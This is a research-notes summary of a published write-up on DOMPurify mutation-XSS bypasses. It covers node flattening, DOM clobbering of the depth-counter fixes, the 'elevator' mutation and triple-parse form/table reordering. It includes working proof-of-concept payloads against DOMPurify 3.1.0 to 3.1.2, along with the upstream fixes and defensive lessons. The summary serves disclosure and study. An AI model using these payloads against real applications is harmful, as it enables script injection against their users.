# mizu: Exploring DOMPurify, bypasses and fixes (part 1 of 2)

- **Vuln type / sub-variant:** Mutation XSS / sanitizer bypass: node flattening, DOM clobbering of the fix, the "elevator" mutation, and triple-parse form/table reordering. Source is part 1 of 2 (config-related bypasses are in part 2, not captured). The intro of the raw page is garbled on the source itself; diagrams and DOM-tree figures are images. Payloads below were decoded from the author's Dom-Explorer links, where `<tag*N>` means N repeated nested tags (Dom-Explorer repeat syntax, not literal HTML).
- **Target type:** DOMPurify 3.1.0, 3.1.1, 3.1.2 (default config), and apps that sanitize or parse HTML more than once (example: Mermaid.js `sanitizeText`).
- **Recon signal:** Previous bypasses (IceFont <=3.1.0) show HTML parsers differ on tree depth; each DOMPurify fix is a new surface to audit, and fuzzing tag triples can reveal new mutations.
- **Root cause (why mXSS works):** The pipeline is parse, sanitize the DOM tree, serialize, insert via `innerHTML`, then the browser parses again. A client-side sanitizer shares the browser parser, but parse(serialize(tree)) does not always equal tree, so a tree that was safe becomes dangerous once re-parsed. Namespace rules (HTML/SVG/MathML) change how the same tag (`<style>`) is parsed: text in HTML, elements in SVG or MathML.
- **Exploitation steps:**
  1. Base mutation: `<form id="outer"><div></form><form id="inner"><input>` re-parses with the inner form dropped (`input` moves to the outer form).
  2. Node flattening (<=3.1.0): browsers cap nesting at 512 and flatten deeper nodes, so an over-deep tree reshapes on re-parse. Payload (<=3.1.0): `<div*506><table><caption><svg><title><table><caption></caption></table></title><style><a id="</style><img src=x onerror=alert()>"></a></style></svg></caption></table>`. Not Firefox.
  3. 3.1.1 fix added a `__depth` counter capped at 255, read via `currentNode.parentNode.__depth`. Bypass: DOM-clobber `parentNode` with `<form><input name="parentNode">` so the count resets, twice (255*2=510 stays under 512), then reuse the table/caption/svg mutation with `desc` and `<a title="</svg></style><img src onerror=alert(1)>">`. Not Firefox.
  4. 3.1.2 fix blocked HTML integration points when switching from SVG to HTML and used `getParentNode`. Bypass: second-order DOM clobbering, because attribute normalization (trim) happens after the clobbering check: `<form id="x ">` becomes `id="x"` and `<input form="x" name="__depth">` now clobbers `__depth`. Combined with the "elevator" mutation that needs no integration point: `<x><y><z><button><z><button></button></z></button><style></style></z></y></x>` pops the `<style>` out (found by fuzzing tag triples), or the `<image>` to `<img>` conversion trick. PoC shape: `<form id="x "><r*504><a><svg><image><a><desc><svg><image></image></svg></desc></a></image><style><a id="</style><img src=x onerror=alert(1)>"></a></style></svg></a></form><input form="x" name="__depth">`. Not Firefox.
  5. Triple parsing (found with hash_kitten and ryotkak): form/table reordering `<form><table></form><form></table></form><div></div>` bumps elements out on a third parse, defeating apps that already parse or sanitize once before the sink (Mermaid calls DOMPurify twice).
- **Bypasses used:** Node flattening; DOM clobbering of `parentNode` and `__depth`; second-order clobbering via attribute trim; insertion-mode/stack-of-open-elements quirks (nested `<caption>` pops elements); form/table reordering; HTML comment smuggled in attributes.
- **Impact:** Full default-config DOMPurify bypasses for each version in the series, fixed upstream (final fix in 3.1.3: remove attributes matching a comment-like pattern so n-time re-parsing is caught on the first parse; author notes this makes security rest on one regex).
- **Bounty:** n/a (not stated)
- **Lesson / pattern:** Every patch to a sanitizer needs adversarial review of the patch itself (clobberable properties, ordering of checks). Sanitize once, insert the DOM (or `RETURN_DOM`) rather than re-serializing, and do not parse the output again.
- **Source:**
  - Title: Exploring the DOMPurify library: Bypasses and Fixes (1/2)
  - Author: mizu.re (mizu)
  - URL: https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes
  - Date: 2024-11-17
  - Disclosed report: none (credits @IcesFont, @hash_kitten, @ryotkak; fixes by cure53 in DOMPurify 3.1.1, 3.1.2, 3.1.3)
  - Raw file: `sources/xss/22-mizu-exploring-dompurify-bypasses-and-fixes.md`

Tags: mutation-xss, sanitizer-bypass, dom-clobbering, namespace-confusion, svg, gadget
